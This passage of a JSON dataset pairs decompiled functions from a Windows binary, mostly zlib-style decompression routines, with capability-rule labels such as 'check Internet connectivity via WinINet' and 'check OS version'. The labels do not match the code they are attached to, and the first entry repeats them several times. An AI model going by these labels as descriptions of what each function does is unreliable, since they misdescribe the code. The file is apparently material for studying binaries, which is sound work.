{
    "0041e1e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e1e8(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.0041e0b0(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "00403f73": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403f73(uint *param_1, char param_2, int32_t param_3)\n\n{\n    uint arg_ch;\n    \n    if ((param_2 != '\\0') && (0xf < param_1[5])) {\n        arg_ch = *param_1;\n        if (param_3 != 0) {\n            fcn.00420150(param_1, arg_ch, param_3);\n        }\n        fcn.0041e801(arg_ch);\n    }\n    param_1[4] = param_3;\n    param_1[5] = 0xf;\n    *(param_3 + param_1) = 0;\n    return;\n}\n",
        "token_count": 154
    },
    "00404746": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404746(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint32_t *puVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint8_t **unaff_EBX;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = *unaff_EBX;\n    puVar8 = *(in_EAX + 0x34);\n    var_10h = unaff_EBX[1];\n    var_8h = *(in_EAX + 0x20);\n    puVar2 = *(in_EAX + 4);\n    var_4h = *(in_EAX + 0x1c);\n    if (puVar8 < *(in_EAX + 0x30)) {\n        var_14h = *(in_EAX + 0x30) + (-1 - puVar8);\n    }\n    else {\n        var_14h = *(in_EAX + 0x2c) - puVar8;\n    }\n    uVar6 = *puVar2;\n    while (puVar7 = puVar8,  uVar6 < 10) {\n    // switch table (10 cases) at 0x404c5a\n        switch(*(uVar6 * 4 + 0x404c5a)) {\n        case 0x4047c4:\n            if ((var_14h < 0x102) || (var_10h < 0xa)) {\ncode_r0x00404865:\n                puVar2[3] = *(puVar2 + 4);\n                puVar2[2] = puVar2[5];\n                *puVar2 = 1;\n                goto code_r0x004048a5;\n            }\n            *(in_EAX + 0x20) = var_8h;\n            *(in_EAX + 0x1c) = var_4h;\n            unaff_EBX[1] = var_10h;\n            puVar4 = *unaff_EBX;\n            *unaff_EBX = var_ch;\n            unaff_EBX[2] = unaff_EBX[2] + (var_ch - puVar4);\n            *(in_EAX + 0x34) = puVar8;\n            arg_8h = fcn.00405bcb(*(puVar2 + 4), *(puVar2 + 0x11), puVar2[5], puVar2[6]);\n            var_ch = *unaff_EBX;\n            puVar8 = *(in_EAX + 0x34);\n            var_10h = unaff_EBX[1];\n            var_8h = *(in_EAX + 0x20);\n            var_4h = *(in_EAX + 0x1c);\n            if (puVar8 < *(in_EAX + 0x30)) {\n                var_14h = *(in_EAX + 0x30) + (-1 - puVar8);\n            }\n            else {\n                var_14h = *(in_EAX + 0x2c) - puVar8;\n            }\n            if (arg_8h == 0) goto code_r0x00404865;\n            *puVar2 = (arg_8h != 1) * 2 + 7;\n            goto code_r0x00404bb4;\n        case 0x4048a5:\ncode_r0x004048a5:\n            for (; var_4h < puVar2[3]; var_4h = var_4h + 8) {\n                if (var_10h == NULL) goto code_r0x00404bc7;\n                arg_8h = 0;\n                var_10h = var_10h + -1;\n                var_8h = var_8h | *var_ch << (var_4h & 0x1f);\n                var_ch = var_ch + 1;\n            }\n            puVar4 = puVar2[2] + (*(puVar2[3] * 4 + 0x43c510) & var_8h) * 8;\n            var_8h = var_8h >> (puVar4[1] & 0x1f);\n            var_4h = var_4h - puVar4[1];\n            uVar1 = *puVar4;\n            uVar6 = uVar1;\n            if (uVar6 == 0) {\n                puVar4 = *(puVar4 + 4);\n                *puVar2 = 6;\n                goto code_r0x004048e4;\n            }\n            if ((uVar1 & 0x10) == 0) {\n                if ((uVar1 & 0x40) != 0) {\n                    if ((uVar1 & 0x20) == 0) {\n                        *puVar2 = 9;\n                        unaff_EBX[6] = \"invalid literal/length code\";\n                        goto code_r0x00404bef;\n                    }\n                    *puVar2 = 7;\n                    goto code_r0x00404bb4;\n                }\n                goto code_r0x00404910;\n            }\n            puVar2[2] = uVar6 & 0xf;\n            puVar2[1] = *(puVar4 + 4);\n            *puVar2 = 2;\n            goto code_r0x00404bb4;\n        case 0x404952:\n            for (; uVar6 = puVar2[2],  var_4h < uVar6; var_4h = var_4h + 8) {\n                if (var_10h == NULL) goto code_r0x00404bc7;\n                arg_8h = 0;\n                var_10h = var_10h + -1;\n                var_8h = var_8h | *var_ch << (var_4h & 0x1f);\n                var_ch = var_ch + 1;\n            }\n            uVar5 = *(uVar6 * 4 + 0x43c510) & var_8h;\n            var_8h = var_8h >> (uVar6 & 0x1f);\n            puVar2[1] = puVar2[1] + uVar5;\n            var_4h = var_4h - uVar6;\n            puVar2[3] = *(puVar2 + 0x11);\n            puVar2[2] = puVar2[6];\n            *puVar2 = 3;\n        case 0x4049aa:\n            for (; var_4h < puVar2[3]; var_4h = var_4h + 8) {\n                if (var_10h == NULL) goto code_r0x00404bc7;\n                arg_8h = 0;\n                var_10h = var_10h + -1;\n                var_8h = var_8h | *var_ch << (var_4h & 0x1f);\n                var_ch = var_ch + 1;\n            }\n            puVar4 = puVar2[2] + (*(puVar2[3] * 4 + 0x43c510) & var_8h) * 8;\n            var_8h = var_8h >> (puVar4[1] & 0x1f);\n            var_4h = var_4h - puVar4[1];\n            uVar1 = *puVar4;\n            uVar6 = uVar1;\n            if ((uVar1 & 0x10) == 0) {\n                if ((uVar1 & 0x40) != 0) {\n                    *puVar2 = 9;\n                    unaff_EBX[6] = \"invalid distance code\";\ncode_r0x00404bef:\n                    arg_8h = -3;\n                    puVar7 = puVar8;\n                    goto code_r0x0040478d;\n                }\ncode_r0x00404910:\n                puVar2[3] = uVar6;\n                puVar4 = puVar4 + *(puVar4 + 4) * 8;\ncode_r0x004048e4:\n                puVar2[2] = puVar4;\n            }\n            else {\n                puVar2[2] = uVar6 & 0xf;\n                puVar2[3] = *(puVar4 + 4);\n                *puVar2 = 4;\n            }\ncode_r0x00404bb4:\n            uVar6 = *puVar2;\n            break;\n        case 0x404a39:\n            for (; uVar6 = puVar2[2],  var_4h < uVar6; var_4h = var_4h + 8) {\n                if (var_10h == NULL) goto code_r0x00404bc7;\n                arg_8h = 0;\n                var_10h = var_10h + -1;\n                var_8h = var_8h | *var_ch << (var_4h & 0x1f);\n                var_ch = var_ch + 1;\n            }\n            uVar5 = *(uVar6 * 4 + 0x43c510) & var_8h;\n            var_8h = var_8h >> (uVar6 & 0x1f);\n            puVar2[3] = puVar2[3] + uVar5;\n            var_4h = var_4h - uVar6;\n            *puVar2 = 5;\n        case 0x404a5c:\n            var_1ch = puVar8 + -puVar2[3];\n            if (var_1ch < *(in_EAX + 0x28)) {\n                do {\n                    var_1ch = var_1ch + (*(in_EAX + 0x2c) - *(in_EAX + 0x28));\n                } while (var_1ch < *(in_EAX + 0x28));\n            }\n            while (puVar2[1] != 0) {\n                puVar7 = puVar8;\n                if (var_14h == NULL) {\n                    if (puVar8 == *(in_EAX + 0x2c)) {\n                        var_14h = *(in_EAX + 0x30);\n                        puVar7 = *(in_EAX + 0x28);\n                        if (var_14h != puVar7) {\n                            if (puVar7 < var_14h) {\n                                var_14h = var_14h + (-1 - puVar7);\n                            }\n                            else {\n                                var_14h = *(in_EAX + 0x2c) - puVar7;\n                            }\n                            puVar8 = puVar7;\n                            if (var_14h != NULL) goto code_r0x00404b05;\n                        }\n                    }\n                    *(in_EAX + 0x34) = puVar8;\n                    arg_8h = fcn.0040462c(arg_8h);\n                    puVar7 = *(in_EAX + 0x34);\n                    puVar8 = *(in_EAX + 0x30);\n                    if (puVar7 < puVar8) {\n                        var_14h = puVar8 + (-1 - puVar7);\n                    }\n                    else {\n                        var_14h = *(in_EAX + 0x2c) - puVar7;\n                    }\n                    if ((puVar7 == *(in_EAX + 0x2c)) && (puVar3 = *(in_EAX + 0x28),  puVar8 != puVar3)) {\n                        puVar7 = puVar3;\n                        if (puVar3 < puVar8) {\n                            var_14h = puVar8 + (-1 - puVar3);\n                        }\n                        else {\n                            var_14h = *(in_EAX + 0x2c) - puVar3;\n                        }\n                    }\n                    if (var_14h == NULL) goto code_r0x0040478d;\n                }\ncode_r0x00404b05:\n                arg_8h = 0;\n                *puVar7 = *var_1ch;\n                puVar8 = puVar7 + 1;\n                var_1ch = var_1ch + 1;\n                var_14h = var_14h + -1;\n                if (var_1ch == *(in_EAX + 0x2c)) {\n                    var_1ch = *(in_EAX + 0x28);\n                }\n                puVar2[1] = puVar2[1] - 1;\n            }\ncode_r0x00404bb1:\n            *puVar2 = 0;\n            goto code_r0x00404bb4;\n        case 0x404b2f:\n            if (var_14h == NULL) {\n                if (puVar8 == *(in_EAX + 0x2c)) {\n                    var_14h = *(in_EAX + 0x30);\n                    puVar7 = *(in_EAX + 0x28);\n                    if (var_14h != puVar7) {\n                        if (puVar7 < var_14h) {\n                            var_14h = var_14h + (-1 - puVar7);\n                        }\n                        else {\n                            var_14h = *(in_EAX + 0x2c) + -puVar7;\n                        }\n                        puVar8 = puVar7;\n                        if (var_14h != NULL) goto code_r0x00404ba0;\n                    }\n                }\n                *(in_EAX + 0x34) = puVar8;\n                arg_8h = fcn.0040462c(arg_8h);\n                puVar7 = *(in_EAX + 0x34);\n                puVar8 = *(in_EAX + 0x30);\n                if (puVar7 < puVar8) {\n                    var_14h = puVar8 + (-1 - puVar7);\n                }\n                else {\n                    var_14h = *(in_EAX + 0x2c) - puVar7;\n                }\n                if ((puVar7 == *(in_EAX + 0x2c)) && (puVar3 = *(in_EAX + 0x28),  puVar8 != puVar3)) {\n                    puVar7 = puVar3;\n                    if (puVar3 < puVar8) {\n                        var_14h = puVar8 + (-1 - puVar3);\n                    }\n                    else {\n                        var_14h = *(in_EAX + 0x2c) - puVar3;\n                    }\n                }\n                if (var_14h == NULL) goto code_r0x0040478d;\n            }\ncode_r0x00404ba0:\n            arg_8h = 0;\n            *puVar7 = *(puVar2 + 2);\n            puVar8 = puVar7 + 1;\n            var_14h = var_14h + -1;\n            goto code_r0x00404bb1;\n        case 0x404bef:\n            goto code_r0x00404bef;\n        case 0x404bfe:\n            if (7 < var_4h) {\n                var_4h = var_4h - 8;\n                var_10h = var_10h + 1;\n                var_ch = var_ch + -1;\n            }\n            *(in_EAX + 0x34) = puVar8;\n            arg_8h = fcn.0040462c(arg_8h);\n            puVar8 = *(in_EAX + 0x34);\n            if (*(in_EAX + 0x30) == puVar8) {\n                *puVar2 = 8;\n                goto code_r0x00404c51;\n            }\n            *(in_EAX + 0x20) = var_8h;\n            *(in_EAX + 0x1c) = var_4h;\n            unaff_EBX[1] = var_10h;\n            puVar4 = *unaff_EBX;\n            *unaff_EBX = var_ch;\n            unaff_EBX[2] = unaff_EBX[2] + (var_ch - puVar4);\n            goto code_r0x004047ab;\n        case 0x404c51:\ncode_r0x00404c51:\n            arg_8h = 1;\n            puVar7 = puVar8;\n            goto code_r0x0040478d;\n        }\n    }\n    arg_8h = -2;\ncode_r0x0040478d:\n    *(in_EAX + 0x20) = var_8h;\n    *(in_EAX + 0x1c) = var_4h;\n    unaff_EBX[1] = var_10h;\n    puVar8 = puVar7;\ncode_r0x0040479f:\n    puVar4 = *unaff_EBX;\n    *unaff_EBX = var_ch;\n    unaff_EBX[2] = unaff_EBX[2] + (var_ch - puVar4);\ncode_r0x004047ab:\n    *(in_EAX + 0x34) = puVar8;\n    fcn.0040462c(arg_8h);\n    return;\ncode_r0x00404bc7:\n    *(in_EAX + 0x20) = var_8h;\n    *(in_EAX + 0x1c) = var_4h;\n    unaff_EBX[1] = NULL;\n    goto code_r0x0040479f;\n}\n",
        "token_count": 3971
    },
    "00404d5d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid __cdecl fcn.00404d5d(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint8_t **in_EAX;\n    uint uVar4;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint8_t *var_18h;\n    uint8_t *var_14h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_10h = arg_8h[0xd];\n    var_ch = in_EAX[1];\n    var_8h = arg_8h[8];\n    var_4h = arg_8h[7];\n    if (var_10h < arg_8h[0xc]) {\n        var_18h = arg_8h[0xc] + (-1 - var_10h);\n    }\n    else {\n        var_18h = arg_8h[0xb] - var_10h;\n    }\n    uVar5 = *arg_8h;\n    puVar6 = *in_EAX;\n    do {\n        var_14h = puVar6;\n        if (9 < uVar5) {\n            iVar7 = -2;\ncode_r0x00404da5:\n            arg_8h[8] = var_8h;\n            uVar5 = var_4h;\ncode_r0x00404dae:\n            arg_8h[7] = uVar5;\n            puVar6 = var_ch;\n            arg_ch = iVar7;\ncode_r0x00404db4:\n            in_EAX[1] = puVar6;\n            iVar7 = arg_ch;\ncode_r0x00404db7:\n            puVar6 = *in_EAX;\n            *in_EAX = var_14h;\n            in_EAX[2] = in_EAX[2] + (var_14h - puVar6);\n            arg_8h[0xd] = var_10h;\ncode_r0x00404dcb:\n            fcn.0040462c(iVar7);\n            return;\n        }\n    // switch table (10 cases) at 0x405535\n        switch(*(uVar5 * 4 + 0x405535)) {\n        case 0x404de0:\n            for (; var_4h < 3; var_4h = var_4h + 8) {\n                if (var_ch == NULL) goto code_r0x0040539b;\n                arg_ch = 0;\n                var_ch = var_ch + -1;\n                var_8h = var_8h | *var_14h << (var_4h & 0x1f);\n                var_14h = var_14h + 1;\n            }\n            uVar5 = (var_8h & 7) >> 1;\n            arg_8h[6] = var_8h & 1;\n            if (uVar5 == 0) {\n                uVar5 = var_4h - 3 & 7;\n                var_8h = (var_8h >> 3) >> uVar5;\n                var_4h = (var_4h - 3) - uVar5;\n                *arg_8h = 1;\n            }\n            else if (uVar5 == 1) {\n                uVar5 = fcn.00404715(9, 5, 0x43c558, 0x43d558);\n                arg_8h[1] = uVar5;\n                if (uVar5 == 0) goto code_r0x004053b3;\n                var_8h = var_8h >> 3;\n                var_4h = var_4h - 3;\n                *arg_8h = 6;\n            }\n            else if (uVar5 == 2) {\n                var_8h = var_8h >> 3;\n                var_4h = var_4h - 3;\n                *arg_8h = 3;\n            }\n            else if (uVar5 == 3) {\n                *arg_8h = 9;\n                in_EAX[6] = \"invalid block type\";\n                arg_8h[8] = var_8h >> 3;\n                uVar5 = var_4h - 3;\n                iVar7 = -3;\n                goto code_r0x00404dae;\n            }\n            break;\n        case 0x404eb7:\n            for (; var_4h < 0x20; var_4h = var_4h + 8) {\n                puVar6 = NULL;\n                if (var_ch == NULL) {\n                    arg_8h[8] = var_8h;\n                    arg_8h[7] = var_4h;\n                    goto code_r0x00404db4;\n                }\n                var_ch = var_ch + -1;\n                arg_ch = 0;\n                var_8h = var_8h | *var_14h << (var_4h & 0x1f);\n                var_14h = var_14h + 1;\n            }\n            if (~var_8h >> 0x10 != (var_8h & 0xffff)) {\n                *arg_8h = 9;\n                in_EAX[6] = \"invalid stored block lengths\";\n                goto code_r0x004053db;\n            }\n            arg_8h[1] = var_8h & 0xffff;\n            var_4h = 0;\n            var_8h = 0;\n            if (arg_8h[1] == 0) {\ncode_r0x00404f11:\n                uVar5 = -(arg_8h[6] != 0) & 7;\n            }\n            else {\n                uVar5 = 2;\n            }\n            *arg_8h = uVar5;\n            break;\n        case 0x404f22:\n            if (var_ch != NULL) {\n                if (var_18h != NULL) {\ncode_r0x00404fba:\n                    arg_ch = 0;\n                    puVar6 = arg_8h[1];\n                    if (var_ch < arg_8h[1]) {\n                        puVar6 = var_ch;\n                    }\n                    if (var_18h < puVar6) {\n                        puVar6 = var_18h;\n                    }\n                    fcn.00420150(var_10h, var_14h, puVar6);\n                    var_14h = var_14h + puVar6;\n                    var_ch = var_ch + -puVar6;\n                    var_10h = var_10h + puVar6;\n                    var_18h = var_18h + -puVar6;\n                    puVar1 = arg_8h + 1;\n                    *puVar1 = *puVar1 - puVar6;\n                    if (*puVar1 == 0) goto code_r0x00404f11;\n                    break;\n                }\n                if (var_10h == arg_8h[0xb]) {\n                    puVar6 = arg_8h[0xc];\n                    puVar3 = arg_8h[10];\n                    if (puVar3 != puVar6) {\n                        if (puVar3 < puVar6) {\n                            var_18h = puVar6 + (-1 - puVar3);\n                        }\n                        else {\n                            var_18h = arg_8h[0xb] + -puVar3;\n                        }\n                        var_10h = puVar3;\n                        if (var_18h != NULL) goto code_r0x00404fba;\n                    }\n                }\n                arg_8h[0xd] = var_10h;\n                iVar7 = fcn.0040462c(arg_ch);\n                var_10h = arg_8h[0xd];\n                puVar6 = arg_8h[0xc];\n                if (var_10h < puVar6) {\n                    var_18h = puVar6 + (-1 - var_10h);\n                }\n                else {\n                    var_18h = arg_8h[0xb] - var_10h;\n                }\n                if (var_10h == arg_8h[0xb]) {\n                    puVar3 = arg_8h[10];\n                    if (puVar3 != puVar6) {\n                        var_10h = puVar3;\n                        if (puVar3 < puVar6) {\n                            var_18h = puVar6 + (-1 - puVar3);\n                        }\n                        else {\n                            var_18h = arg_8h[0xb] + -puVar3;\n                        }\n                    }\n                }\n                if (var_18h != NULL) goto code_r0x00404fba;\n                goto code_r0x004053e2;\n            }\ncode_r0x0040539b:\n            arg_8h[8] = var_8h;\n            arg_8h[7] = var_4h;\n            in_EAX[1] = NULL;\n            iVar7 = arg_ch;\n            goto code_r0x00404db7;\n        case 0x404ffa:\n            for (; puVar6 = var_14h,  var_4h < 0xe; var_4h = var_4h + 8) {\n                if (var_ch == NULL) goto code_r0x0040539b;\n                arg_ch = 0;\n                var_ch = var_ch + -1;\n                var_8h = var_8h | *var_14h << (var_4h & 0x1f);\n                var_14h = var_14h + 1;\n            }\n            arg_8h[1] = var_8h & 0x3fff;\n            if ((0x1d < (var_8h & 0x1f)) || (uVar5 = (var_8h & 0x3fff) >> 5 & 0x1f,  0x1d < uVar5)) {\n                *arg_8h = 9;\n                in_EAX[6] = \"too many length or distance symbols\";\n                goto code_r0x004053db;\n            }\n            uVar5 = (*in_EAX[8])(in_EAX[10], uVar5 + 0x102 + (var_8h & 0x1f), 4);\n            arg_8h[3] = uVar5;\n            if (uVar5 != 0) {\n                var_8h = var_8h >> 0xe;\n                var_4h = var_4h - 0xe;\n                arg_8h[2] = 0;\n                *arg_8h = 4;\n                goto code_r0x004050cf;\n            }\ncode_r0x004053b3:\n            iVar7 = -4;\n            goto code_r0x00404da5;\n        case 0x4050cf:\ncode_r0x004050cf:\n            while (arg_8h[2] < (arg_8h[1] >> 10) + 4) {\n                for (; var_4h < 3; var_4h = var_4h + 8) {\n                    if (var_ch == NULL) goto code_r0x0040539b;\n                    arg_ch = 0;\n                    var_ch = var_ch + -1;\n                    var_8h = var_8h | *puVar6 << (var_4h & 0x1f);\n                    puVar6 = puVar6 + 1;\n                    var_14h = puVar6;\n                }\n                *(arg_8h[3] + *(arg_8h[2] * 4 + 0x43d658) * 4) = var_8h & 7;\n                arg_8h[2] = arg_8h[2] + 1;\n                var_4h = var_4h - 3;\n                var_8h = var_8h >> 3;\n            }\n            while (arg_8h[2] < 0x13) {\n                *(arg_8h[3] + *(arg_8h[2] * 4 + 0x43d658) * 4) = 0;\n                arg_8h[2] = arg_8h[2] + 1;\n            }\n            arg_8h[4] = 7;\n            iVar7 = fcn.00405a2f(arg_8h[3], arg_8h + 4, arg_8h + 5, arg_8h[9]);\n            if (iVar7 == 0) {\n                arg_8h[2] = 0;\n                *arg_8h = 5;\n                puVar6 = var_14h;\n                goto code_r0x00405254;\n            }\n            if (iVar7 == -3) {\n                (*in_EAX[9])(in_EAX[10], arg_8h[3]);\n                *arg_8h = 9;\n            }\n            goto code_r0x00404da5;\n        case 0x405254:\ncode_r0x00405254:\n            while (arg_8h[2] < (arg_8h[1] >> 5 & 0x1f) + 0x102 + (arg_8h[1] & 0x1f)) {\n                for (; var_4h < arg_8h[4]; var_4h = var_4h + 8) {\n                    if (var_ch == NULL) goto code_r0x0040539b;\n                    arg_ch = 0;\n                    var_ch = var_ch + -1;\n                    var_8h = var_8h | *puVar6 << (var_4h & 0x1f);\n                    puVar6 = puVar6 + 1;\n                    var_14h = puVar6;\n                }\n                iVar7 = arg_8h[5] + (*(arg_8h[4] * 4 + 0x43c510) & var_8h) * 8;\n                uVar2 = *(iVar7 + 1);\n                var_1ch = uVar2;\n                var_20h = *(iVar7 + 4);\n                if (var_20h < 0x10) {\n                    var_8h = var_8h >> (uVar2 & 0x1f);\n                    var_4h = var_4h - var_1ch;\n                    *(arg_8h[3] + arg_8h[2] * 4) = var_20h;\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    if (var_20h == 0x12) {\n                        iVar7 = 7;\n                    }\n                    else {\n                        iVar7 = var_20h - 0xe;\n                    }\n                    var_18h = (var_20h == 0x12) * 8 + 3;\n                    for (; var_4h < iVar7 + var_1ch; var_4h = var_4h + 8) {\n                        if (var_ch == NULL) goto code_r0x0040539b;\n                        arg_ch = 0;\n                        var_ch = var_ch + -1;\n                        var_8h = var_8h | *puVar6 << (var_4h & 0x1f);\n                        puVar6 = puVar6 + 1;\n                        var_14h = puVar6;\n                    }\n                    var_8h = var_8h >> (uVar2 & 0x1f);\n                    var_18h = var_18h + (*(iVar7 * 4 + 0x43c510) & var_8h);\n                    var_8h = var_8h >> (iVar7 & 0x1f);\n                    var_4h = var_4h - (iVar7 + var_1ch);\n                    uVar5 = arg_8h[2];\n                    if ((arg_8h[1] >> 5 & 0x1f) + 0x102 + (arg_8h[1] & 0x1f) < var_18h + uVar5) {\ncode_r0x00405437:\n                        (*in_EAX[9])(in_EAX[10], arg_8h[3]);\n                        *arg_8h = 9;\n                        in_EAX[6] = \"invalid bit length repeat\";\n                        arg_8h[8] = var_8h;\n                        arg_8h[7] = var_4h;\n                        in_EAX[1] = var_ch;\n                        puVar6 = *in_EAX;\n                        *in_EAX = var_14h;\n                        in_EAX[2] = in_EAX[2] + (var_14h - puVar6);\n                        arg_8h[0xd] = var_10h;\n                        fcn.0040462c(0xfffffffd);\n                        return;\n                    }\n                    if (var_20h == 0x10) {\n                        if (uVar5 == 0) goto code_r0x00405437;\n                        uVar4 = *((arg_8h[3] - 4) + uVar5 * 4);\n                    }\n                    else {\n                        uVar4 = 0;\n                    }\n                    do {\n                        *(arg_8h[3] + uVar5 * 4) = uVar4;\n                        uVar5 = uVar5 + 1;\n                        var_18h = var_18h + -1;\n                    } while (var_18h != NULL);\n                    arg_8h[2] = uVar5;\n                }\n            }\n            arg_8h[5] = 0;\n            var_18h = 0x9;\n            var_1ch = 6;\n            iVar7 = fcn.00405aab((arg_8h[1] >> 5 & 0x1f) + 1, &var_18h, &var_1ch, &var_28h, &var_24h, arg_8h[9]);\n            if (iVar7 != 0) {\n                if (iVar7 == -3) {\n                    (*in_EAX[9])(in_EAX[10], arg_8h[3]);\n                    *arg_8h = 9;\n                }\n                arg_8h[8] = var_8h;\n                arg_8h[7] = var_4h;\n                in_EAX[1] = var_ch;\n                puVar6 = *in_EAX;\n                *in_EAX = var_14h;\n                in_EAX[2] = in_EAX[2] + (var_14h - puVar6);\n                arg_8h[0xd] = var_10h;\n                goto code_r0x00404dcb;\n            }\n            uVar5 = fcn.00404715(var_18h, var_1ch, var_28h, var_24h);\n            if (uVar5 == 0) {\n                arg_8h[8] = var_8h;\n                arg_8h[7] = var_4h;\n                in_EAX[1] = var_ch;\n                puVar6 = *in_EAX;\n                *in_EAX = var_14h;\n                in_EAX[2] = in_EAX[2] + (var_14h - puVar6);\n                arg_8h[0xd] = var_10h;\n                iVar7 = -4;\n                goto code_r0x00404dcb;\n            }\n            arg_8h[1] = uVar5;\n            (*in_EAX[9])(in_EAX[10], arg_8h[3]);\n            *arg_8h = 6;\ncode_r0x00405303:\n            arg_8h[8] = var_8h;\n            arg_8h[7] = var_4h;\n            in_EAX[1] = var_ch;\n            puVar6 = *in_EAX;\n            *in_EAX = var_14h;\n            in_EAX[2] = in_EAX[2] + (var_14h - puVar6);\n            arg_8h[0xd] = var_10h;\n            iVar7 = fcn.00404746(arg_ch);\n            if (iVar7 != 1) goto code_r0x00404dcb;\n            arg_ch = 0;\n            (*in_EAX[9])(in_EAX[10], arg_8h[1]);\n            var_14h = *in_EAX;\n            var_ch = in_EAX[1];\n            var_8h = arg_8h[8];\n            var_4h = arg_8h[7];\n            var_10h = arg_8h[0xd];\n            if (var_10h < arg_8h[0xc]) {\n                var_18h = arg_8h[0xc] + (-1 - var_10h);\n            }\n            else {\n                var_18h = arg_8h[0xb] - var_10h;\n            }\n            if (arg_8h[6] != 0) {\n                *arg_8h = 7;\ncode_r0x00405506:\n                arg_8h[0xd] = var_10h;\n                iVar7 = fcn.0040462c(arg_ch);\n                var_10h = arg_8h[0xd];\n                if (arg_8h[0xc] != var_10h) {\ncode_r0x004053e2:\n                    arg_8h[8] = var_8h;\n                    arg_8h[7] = var_4h;\n                    in_EAX[1] = var_ch;\n                    puVar6 = *in_EAX;\n                    *in_EAX = var_14h;\n                    in_EAX[2] = in_EAX[2] + (var_14h - puVar6);\n                    arg_8h[0xd] = var_10h;\n                    goto code_r0x00404dcb;\n                }\n                *arg_8h = 8;\ncode_r0x0040552c:\n                iVar7 = 1;\n                goto code_r0x00404da5;\n            }\n            *arg_8h = 0;\n            break;\n        case 0x405303:\n            goto code_r0x00405303;\n        case 0x4053db:\ncode_r0x004053db:\n            iVar7 = -3;\n            goto code_r0x00404da5;\n        case 0x405506:\n            goto code_r0x00405506;\n        case 0x40552c:\n            goto code_r0x0040552c;\n        }\n        uVar5 = *arg_8h;\n        puVar6 = var_14h;\n    } while( true );\n}\n",
        "token_count": 5161
    },
    "0040555d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_110h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040555d(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, int32_t arg_1ch, \n            uint32_t *arg_20h, uint32_t *arg_24h)\n\n{\n    int32_t *in_ECX;\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uint var_110h;\n    int32_t *var_d4h;\n    int32_t var_d0h;\n    uint32_t *var_cch;\n    int32_t var_c8h;\n    uint32_t var_c4h;\n    uint32_t *var_c0h;\n    uint32_t *var_bch;\n    uint32_t var_b8h;\n    int32_t var_b4h;\n    int32_t var_b0h;\n    uint32_t var_ach;\n    uint var_a8h;\n    uint32_t var_a4h;\n    int32_t *var_a0h;\n    uint32_t *var_9ch;\n    int32_t var_98h;\n    uint32_t var_94h;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint var_88h;\n    uint var_84h;\n    int32_t aiStack132 [14];\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint 